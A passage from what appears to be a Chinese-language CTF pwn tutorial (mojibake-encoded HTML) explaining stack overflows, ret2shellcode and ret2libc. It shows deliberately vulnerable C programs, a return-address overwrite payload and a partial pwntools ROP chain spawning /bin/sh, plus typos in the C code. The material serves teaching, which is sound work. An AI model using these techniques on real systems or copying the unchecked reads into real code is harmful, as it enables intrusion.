</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>      <span class="c1">// å±€éƒ¨å˜é‡ï¼š80å­—èŠ‚çš„æ•°ç»„
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">200</span><span class="p">);</span> <span class="c1">// ä»æ ‡å‡†è¾“å…¥è¯»å–200å­—èŠ‚åˆ°bufï¼ˆæ— é•¿åº¦æ£€æŸ¥ï¼Œå¿…ç„¶æº¢å‡ºï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// è°ƒç”¨func_açš„å‡½æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">func_b</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">func_a</span><span class="p">();</span>          <span class="c1">// è°ƒç”¨æ¼æ´å‡½æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>             <span class="c1">// å±€éƒ¨å˜é‡c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">c</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>             <span class="c1">// ç»™cèµ‹å€¼
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// ä¸»å‡½æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">func_b</span><span class="p">();</span>          <span class="c1">// è°ƒç”¨func_b
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">a</span><span class="p">;</span>             <span class="c1">// å±€éƒ¨å˜é‡a
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">a</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>             <span class="c1">// ç»™aèµ‹å€¼
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>mainå‡½æ•°è°ƒç”¨bï¼Œbå‡½æ•°è°ƒç”¨aã€‚ç¼“å†²åŒºæº¢å‡ºå‘ç”Ÿåœ¨aå‡½æ•°ä¸­ã€‚</p>
<p><em>bufçš„é•¿åº¦ä¸º80ï¼Œä½†æ˜¯å´è¯»å…¥äº†200é•¿åº¦ã€‚</em>ï¼ˆæ ˆæº¢å‡ºï¼‰</p>
<p>åˆ†æç¨‹åºè¿è¡Œè‡³aæ—¶çš„æ ˆå¸§ã€æ ˆä¸­å­˜æ”¾bufå’Œè¿”å›åœ°å€ç­‰ç­‰ä¿¡æ¯ï¼š
<img src="/p/pwn-2/1.png"
	width="413"
	height="840"
	srcset="/p/pwn-2/1_hu_2535d359c272f0be.png 480w, /p/pwn-2/1_hu_de5df19999eb436.png 1024w"
	loading="lazy"
	
		alt="bufçš„é•¿åº¦ä¸º80ï¼Œç´§é‚»bå‡½æ•°çš„rbpæŒ‡é’ˆå’Œè¿”å›åœ°å€"
	
	
		class="gallery-image" 
		data-flex-grow="49"
		data-flex-basis="118px"
	
></p>
<p>è¾“å…¥200é•¿åº¦é€ æˆæ ˆæº¢å‡ºï¼Œè¶…å‡ºçš„ 120 å­—èŠ‚ä¼šå‘ä¸Šè¦†ç›–æ ˆä¸­æ›´é«˜åœ°å€çš„å†…å®¹å¦‚retï¼ˆå› ä¸ºæ ˆå‘ä¸‹ç”Ÿé•¿ï¼Œè¶Šç•Œå†™ä¼šå‘é«˜åœ°å€è”“å»¶ï¼‰ã€‚</p>
<p><strong>è¦†ç›–è¿”å›åœ°å€å¯ä»¥æ§åˆ¶ç¨‹åºä¸‹ä¸€æ­¥æ‰§è¡Œçš„ä½ç½®ï¼Œè€Œé€šè¿‡æ§åˆ¶æ‰§è¡Œä½ç½®ï¼Œæ”»å‡»è€…å¯ä»¥é—´æ¥å®ç° â€œä¿®æ”¹ä»»æ„åœ°å€â€ çš„æ•ˆæœ</strong>ã€‚</p>
<p>ä¸¾ä¾‹ï¼Œæ”»å‡»è€…æ„é€ è¾“å…¥ï¼šå‰ 84 å­—èŠ‚å¡«å……æ— å…³æ•°æ®ï¼ˆè¦†ç›–bufå’Œfunc_b()çš„ ebpï¼‰ï¼Œç¬¬ 85~88 å­—èŠ‚å¡«å…¥0x12345678ï¼ˆå°ç«¯åºå¯èƒ½éœ€è¦åå†™ä¸º0x78563412ï¼‰ï¼›è¿™æ—¶è¿”å›åœ°å€è¢«è¦†ç›–æˆ0x12345678ï¼Œç›´æ¥è·³è½¬åˆ°0x12345678ï¼ˆå¯èƒ½æ˜¯æ”»å‡»è€…çš„ä»£ç ï¼‰ã€‚</p>
<p>é‚£è¯´èµ·è¿”å›åœ°å€è¿™ä¸€å—ï¼Œå›å¿†ä¸€ä¸‹ï¼š</p>
<blockquote>
<p>è°ƒç”¨å‡½æ•°ï¼šåªéœ€è¦å°†ripå‹æ ˆï¼Œå³push ripï¼Œç„¶åè®²ripèµ‹å€¼ä¸ºè¢«è°ƒç”¨å‡½æ•°çš„èµ·å§‹åœ°å€ï¼Œè¿™ä¸€æ“ä½œè¢«éšæ€§çš„å†…ç½®åœ¨callæŒ‡ä»¤ä¸­ã€‚</p>
<p>è¢«è°ƒç”¨å‡½æ•°ï¼špush rbpï¼›mov rbp rsp; sub rsp oxxxxã€‚å³ä¿å­˜è°ƒç”¨å‡½æ•°çš„rbpæŒ‡é’ˆï¼Œå°†è‡ªå·±çš„rbpæŒ‡é’ˆæŒ‡å‘æ ˆé¡¶ï¼Œç„¶åå¼€è¾Ÿæ ˆç©ºé—´ç»™è‡ªå·±ç”¨ï¼Œæ­¤æ—¶rbpå°±
å˜æˆäº†è¢«è°ƒç”¨å‡½æ•°çš„æ ˆåº•ã€‚</p>
<p>å‡½æ•°è¿”å›ï¼šleaveï¼›retï¼›ç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼šmov rsp rbpï¼›pop rbpï¼›pop ripï¼›å³æ¢å¤æ ˆå¸§ï¼Œè¿”å›è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€ã€‚</p></blockquote>
<p>æ ˆæº¢å‡ºçš„æ ¸å¿ƒæ˜¯<strong>è¦†ç›–ç¨‹åºä¸­ â€œä¼šè¢«ç”¨æ¥å†³å®šä¸‹ä¸€æ­¥æ‰§è¡Œä½ç½®â€ çš„æ•°æ®</strong>ï¼Œè¿™äº›æ•°æ®æœªå¿…æ˜¯<code>ret</code>æŒ‡ä»¤è¯»å–çš„ â€œè¿”å›åœ°å€â€ã€‚å¦‚æœæ ˆä¸­å­˜åœ¨è¢«<code>jmp</code>ã€<code>call</code>ç­‰æŒ‡ä»¤ä½¿ç”¨çš„ â€œç›®æ ‡åœ°å€â€ï¼ˆæ¯”å¦‚å‡½æ•°æŒ‡é’ˆã€è·³è½¬è¡¨é¡¹ç­‰ï¼‰ï¼Œè¦†ç›–è¿™äº›åœ°å€åŒæ ·èƒ½å®ç°<strong>æ§åˆ¶æµåŠ«æŒ</strong>ã€‚</p>
<p>å…·ä½“æ¥è¯´ï¼š<code>ret</code>ã€<code>jmp</code>ã€<code>call</code>çš„å…±æ€§ä¸å·®å¼‚ï¼š</p>
<ul>
<li><strong><code>ret</code>æŒ‡ä»¤</strong>ï¼šä»æ ˆä¸­è¯»å– â€œè¿”å›åœ°å€â€ å¹¶è·³è½¬ï¼ˆä¾èµ–æ ˆä¸­å­˜å‚¨çš„åœ°å€ï¼‰</li>
<li><strong><code>call åœ°å€</code>æŒ‡ä»¤</strong>ï¼šå°†å½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡åœ°å€å‹æ ˆï¼Œç„¶åè·³è½¬åˆ° â€œåœ°å€â€ï¼ˆè‹¥ â€œåœ°å€â€ å­˜å‚¨åœ¨æ ˆä¸­ä¸”å¯è¢«è¦†ç›–ï¼Œåˆ™<code>call</code>çš„ç›®æ ‡ä¼šè¢«ç¯¡æ”¹ï¼‰</li>
<li><strong><code>jmp åœ°å€</code>æŒ‡ä»¤</strong>ï¼šç›´æ¥è·³è½¬åˆ° â€œåœ°å€â€ï¼ˆè‹¥ â€œåœ°å€â€ å­˜å‚¨åœ¨æ ˆä¸­ä¸”å¯è¢«è¦†ç›–ï¼Œåˆ™<code>jmp</code>çš„ç›®æ ‡ä¼šè¢«ç¯¡æ”¹ï¼‰</li>
</ul>
<p>åªè¦è¿™äº›æŒ‡ä»¤ä¾èµ–çš„ â€œç›®æ ‡åœ°å€â€ å­˜å‚¨åœ¨æ ˆä¸­ï¼Œä¸”èƒ½è¢«æ ˆæº¢å‡ºè¦†ç›–ï¼Œå°±èƒ½åŠ«æŒæ§åˆ¶æµã€‚<code>ret</code>åªæ˜¯æœ€å¸¸è§çš„åœºæ™¯ï¼ˆå› ä¸ºå‡½æ•°è°ƒç”¨çš„è¿”å›åœ°å€å‡ ä¹å¿…ç„¶åœ¨æ ˆä¸Šï¼‰ï¼Œè€Œ<code>jmp</code>/<code>call</code>çš„ç›®æ ‡è‹¥åœ¨æ ˆä¸Šï¼ŒåŒæ ·å¯ä»¥è¢«åˆ©ç”¨ã€‚</p>
<p>æ€»ä¹‹ï¼šæ ˆæº¢å‡ºçš„åŸç†å°±æ˜¯æ ˆä¸­å­˜å‚¨çš„å±€éƒ¨å˜é‡æ•°ç»„å‘ç”Ÿæº¢å‡ºï¼Œè¦†ç›–äº†æ ˆä¸­çš„å…¶ä»–æ•°æ®ã€‚å°†è¿”å›åœ°å€è¦†ç›–ä¸ºæˆ‘ä»¬æœŸæœ›çš„ç›®æ ‡åœ°å€ï¼Œå³å¯åŠ«æŒæ§åˆ¶æµã€‚</p>
<h3 id="æ ˆæº¢å‡ºåœ¨ctfä¸­çš„åº”ç”¨">æ ˆæº¢å‡ºåœ¨CTFä¸­çš„åº”ç”¨
</h3><p>ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨CTFä¸­çš„PWNï¼Œå¤šæ•°æƒ…å†µä¸‹æˆ‘ä»¬éœ€è¦è®©ç¨‹åºæ‰§è¡Œè¿™ä¸€æ®µä»£ç ï¼š
<strong><code>system(&quot;/bin/sh&quot;)</code></strong></p>
<p>ä¹Ÿå°±æ˜¯è¯´åœ¨è¿œç¨‹æœºå™¨ä¸Šå¼€ä¸€ä¸ªå‘½ä»¤è¡Œç»ˆç«¯ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ¥æ§åˆ¶ç›®æ ‡æœºå™¨ã€‚</p>
<p>é€šå¸¸æ¥è¯´ï¼ŒCTFæ¯”èµ›ä¸­åªéœ€è¦å¼€å¯å‘½ä»¤è¡Œåè¯»flag(cat flagï¼‰ã€‚</p>
<h2 id="åŸºæœ¬æ ˆæº¢å‡º">åŸºæœ¬æ ˆæº¢å‡º
</h2><p>å¦‚æœç¨‹åºä¸­æ²¡æœ‰systemè¿™æ ·çš„ä»£ç å‡ºç°ï¼Œæ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬å¯ä»¥è‡ªå·±å†™shellcodeï¼</p>
<p>**<code>shellcode</code>**å°±æ˜¯ä¸€æ®µå¯ä»¥ç‹¬ç«‹å¼€å¯shellçš„ä¸€æ®µæ±‡ç¼–ä»£ç ã€‚</p>
<p>ret2shellcodeçš„æ€è·¯å°±æ˜¯ï¼š</p>
<p>å¦‚æœç¨‹åºä¸­å­˜åœ¨è®©ç”¨æˆ·å‘ä¸€æ®µé•¿åº¦è¶³å¤Ÿçš„ç¼“å†²åŒºä¸­è¾“å…¥æ•°æ®ã€‚æˆ‘ä»¬å‘å…¶ä¸­è¾“å…¥shellcodeï¼Œå°†ç¨‹åºåŠ«æŒåˆ°shellcodeä¸Šå³å¯ã€‚å½“ç„¶ï¼Œè¿™ç§ä¹Ÿæ˜¯ç†æƒ³æƒ…å†µã€‚</p>
<blockquote>
<p><code>ret2shellcode</code>æ˜¯äºŒè¿›åˆ¶æ¼ï¼šæ´åˆ©ç”¨ä¸­çš„ä¸€ç§å¸¸è§æŠ€æœ¯ï¼Œç”¨äºåœ¨å­˜åœ¨æ ˆæº¢å‡ºç­‰æ¼æ´çš„ç¨‹åºä¸­è·å–ç³»ç»Ÿçš„ shell æƒé™ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚<code>ret2shellcode</code>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°†è¿”å›åœ°å€è¦†ç›–ä¸ºä¸€æ®µç²¾å¿ƒæ„é€ çš„æœºå™¨ç ï¼ˆå³ shellcodeï¼‰çš„åœ°å€ï¼Œä»è€Œè¿”å›åˆ°æ”»å‡»è€…ç•™ä¸‹çš„shellcodeè¿›è¡ŒåŠ«æŒã€‚</p></blockquote>
<h3 id="æ ˆæº¢å‡ºæ¡ˆä¾‹ret2shellcode">æ ˆæº¢å‡ºæ¡ˆä¾‹ï¼šret2shellcode
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;stdlib.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;stdio.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#incldue &#34;unistd.h&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">global_buf</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">gen_shell</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">execv</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;wow&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vul</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&#34;input:&#34;</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mi">200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;done</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mpritect</span><span class="p">(</span><span class="mh">0x404000</span><span class="p">,</span><span class="mi">1000</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;gen_shell:0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="kt">unsigned</span><span class="p">)</span><span class="o">&amp;</span><span class="n">gen_shell</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;global_buf:0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="kt">unsigned</span><span class="p">)</span><span class="o">&amp;</span><span class="n">global_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&#34;global:&#34;</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">global_buf</span><span class="p">,</span><span class="mi">200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">vul</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;goodbye!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>vulå‡½æ•°å­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œå¯ä»¥åŠ«æŒæ§åˆ¶æµåˆ°gen_shellå‡½æ•°ã€å¯ä»¥åŠ«æŒæ§åˆ¶æµåˆ°global_bufã€‚</p>
<p>å±€éƒ¨å˜é‡<code>buf[80]</code>ä»…åˆ†é… 80 å­—èŠ‚ï¼Œä½†<code>read(0, buf, 200)</code>è¯»å– 200 å­—èŠ‚è¾“å…¥ï¼Œè¶…å‡ºçš„ 120 å­—èŠ‚ä¼šè¦†ç›–æ ˆä¸­æ›´é«˜åœ°å€çš„æ•°æ®ï¼ˆåŒ…æ‹¬<code>ebp</code>å’Œè¿”å›åœ°å€ï¼‰ï¼Œå±äºå…¸å‹çš„æ ˆæº¢å‡ºæ¼æ´ã€‚</p>
<h4 id="æ–¹æ³•ä¸€ç”Ÿæˆpayloadè„šæœ¬åŠ«æŒ">æ–¹æ³•ä¸€ï¼šç”Ÿæˆpayloadè„šæœ¬åŠ«æŒ
</h4><p>vul()å‡½æ•°ä¸­ï¼Œbuf[80]æ˜¯å±€éƒ¨å˜é‡ï¼Œæ ˆå¸ƒå±€ä»ä½åˆ°é«˜ä¸ºï¼šbuf[0..79] â†’ ebpï¼ˆ4 å­—èŠ‚ï¼Œ32 ä½ç³»ç»Ÿï¼‰ â†’ è¿”å›åœ°å€ï¼ˆ4 å­—èŠ‚ï¼‰ã€‚</p>
<p>è¦†ç›–è¿”å›åœ°å€éœ€è¦å…ˆå¡«å……ï¼š80å­—èŠ‚ï¼ˆbufï¼‰ + 4å­—èŠ‚ï¼ˆè¦†ç›–ebpï¼‰ï¼Œä¹‹åçš„ 4 å­—èŠ‚å°±æ˜¯è¦å†™å…¥çš„è¿”å›åœ°å€ï¼ˆå³gen_shellçš„åœ°å€ï¼‰ã€‚</p>
<p>æ„é€ æ”»å‡»æ•°æ®ï¼ˆä»¥ Python ä¸ºä¾‹ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># å‡è®¾gen_shellåœ°å€ä¸º0x401120ï¼Œå°ç«¯åºä¸ºb&#39;\x20\x11\x40\x00&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">80</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x20\x11\x40\x00</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># è¾“å‡ºåˆ°ç¨‹åºè¾“å…¥</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¾“å…¥æ”»å‡»æ•°æ®åï¼Œ<code>vul()</code>å‡½æ•°æ‰§è¡Œ<code>return</code>æ—¶ï¼Œè¿”å›åœ°å€å·²è¢«è¦†ç›–ä¸º<code>0x401120</code>ï¼Œç¨‹åºä¼šè·³è½¬åˆ°<code>gen_shell</code>å‡½æ•°ï¼Œæ‰§è¡Œ<code>execv(&quot;/bin/sh&quot;, 0)</code>ï¼ŒæˆåŠŸè·å– shellã€‚</p>
<h4 id="æ–¹æ³•äºŒåˆ©ç”¨æ ˆæº¢å‡ºè·³è½¬åˆ°shellcode">æ–¹æ³•äºŒï¼šåˆ©ç”¨æ ˆæº¢å‡ºè·³è½¬åˆ°shellcode
</h4><p>æ„é€  payload è¦†ç›– <code>vul()</code> å‡½æ•°çš„è¿”å›åœ°å€ä¸º <code>global_buf</code> çš„åœ°å€ï¼ˆå³ shellcode æ‰€åœ¨ä½ç½®ï¼‰&hellip;&hellip;</p>
<h3 id="ret2libc">ret2libc
</h3><p>æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ä¸€äº›ç³»ç»Ÿå‡½æ•°ï¼Œå°±æ¯”å¦‚è¯´systemæˆ–è€…execvç­‰ã€‚ç¨‹åºä¸­å¯èƒ½ä¸ä¼šæä¾›ä¸€äº›ç°æˆçš„å‡½æ•°ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬æ‹¿åˆ°äº†libcä¸­å‡½æ•°çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨libcä¸­çš„å‡½æ•°ï¼Œåªéœ€è¦ä¼ é€’å¥½å‚æ•°ï¼Œç„¶åcallå³å¯ã€‚</p>
<p>å¦‚ä½•ä¼ å‚ï¼Ÿå¦‚ä½•è°ƒç”¨<code>system(/bin/sh)</code>ï¼Ÿ</p>
<p>åªéœ€è¦å°†rdiè®¾ç½®ä¸º/bin/shå­—ç¬¦ä¸²åœ°å€ï¼Œç„¶åcall systemå³å¯ã€‚</p>
<p>å¦‚ä½•è®¾ç½®movï¼Ÿ</p>
<p>å¦‚æœç›´æ¥movï¼Œç„¶åcallï¼Œé‚£ä¹ˆå°±å’Œret2shellcodeæ— å¼‚ã€‚</p>
<p>ç°åœ¨é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬åªæœ‰ä¸€ä¸ªlibcåœ°å€å’Œ/bin/shå­—ç¬¦ä¸²åœ°å€ï¼Œä»¥åŠä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œæ€ä¹ˆä¼ é€’å‚æ•°ï¼Ÿ</p>
<p>pop rdi ret + /bin/shåœ°å€ + system</p>
<p>æ¥ä¸ªä¾‹å­ï¼šæœ‰ä¸€ä¸ªå­˜åœ¨æ ˆæº¢å‡ºçš„ 64 ä½ç¨‹åº vuln</p>
<ol>
<li>
<p>æœ‰ä¸€ä¸ªæ¼æ´å‡½æ•° <code>vul()</code>ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼ˆå¯è¦†ç›–è¿”å›åœ°å€ï¼‰ï¼›</p>
</li>
<li>
<p>ç¨‹åºåŠ è½½äº† libc åº“ï¼ˆå¿…ç„¶åŒ…å« <code>system</code> å‡½æ•°ï¼‰ï¼›</p>
</li>
<li>
<p>æˆ‘ä»¬é€šè¿‡ä¿¡æ¯æ³„éœ²å·²ç»è·å–åˆ°ï¼š</p>
<ul>
<li><code>system</code> å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼š<code>0x7ffff7839410</code></li>
<li><code>&quot;/bin/sh&quot;</code> å­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼š<code>0x7ffff79e5aaa</code></li>
<li>ä¸€ä¸ª <code>pop rdi; ret</code> gadget çš„åœ°å€ï¼š<code>0x401273</code>ï¼ˆä»ç¨‹åºä¸­æ‰¾åˆ°ï¼‰</li>
</ul>
</li>
<li>
<p>ç»è°ƒè¯•ï¼Œè¦†ç›– <code>vul()</code> å‡½æ•°è¿”å›åœ°å€éœ€è¦å…ˆå¡«å…… <strong>120 å­—èŠ‚</strong>ï¼ˆå‰ 120 å­—èŠ‚ä¼šè¦†ç›–å±€éƒ¨å˜é‡å’Œ <code>rbp</code>ï¼‰ã€‚</p>
<blockquote>
<p>å‡½æ•°çš„<strong>ç¬¬ä¸€ä¸ªå‚æ•°</strong>é€šè¿‡ <code>rdi</code> å¯„å­˜å™¨ä¼ é€’ã€‚å› æ­¤è°ƒç”¨ <code>system(&quot;/bin/sh&quot;)</code> å¿…é¡»æ»¡è¶³ï¼š</p>
<p><code>rdi</code> å¯„å­˜å™¨ä¸­å­˜æ”¾ <code>&quot;/bin/sh&quot;</code> å­—ç¬¦ä¸²çš„åœ°å€ï¼ˆ<code>0x7ffff79e5aaa</code>ï¼‰ï¼›</p>
<p>ç¨‹åºè·³è½¬åˆ° <code>system</code> å‡½æ•°çš„åœ°å€ï¼ˆ<code>0x7ffff7839410</code>ï¼‰æ‰§è¡Œã€‚</p></blockquote>
</li>
</ol>
<p>é€šè¿‡æ ˆæº¢å‡ºæ„é€  payloadï¼Œæœ€ç»ˆè®©ç¨‹åºæ‰§è¡Œ <code>system(&quot;/bin/sh&quot;)</code>ï¼Œè·å– shellã€‚</p>
<p>ç”¨ Python ä»£ç ç”Ÿæˆ payloadï¼ˆpwntoolsï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ„é€  payload</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">120</span>  <span class="c1"># è¦†ç›–åˆ°è¿”å›åœ°å€çš„åç§»é‡</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x401273</span>  <span class="c1"># pop rdi; ret gadget åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="mh">0x7ffff79e5aaa</span>  <span class="c1"># &#34;/bin/sh&#34; åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x7ffff7839410</span>  <span class="c1"># system å‡½æ•°åœ°å€</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>                <span class="c1"># å¡«å……åç§»</span>
</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>           <span class="c1"># æ”¾å…¥ gadget åœ°å€</span>
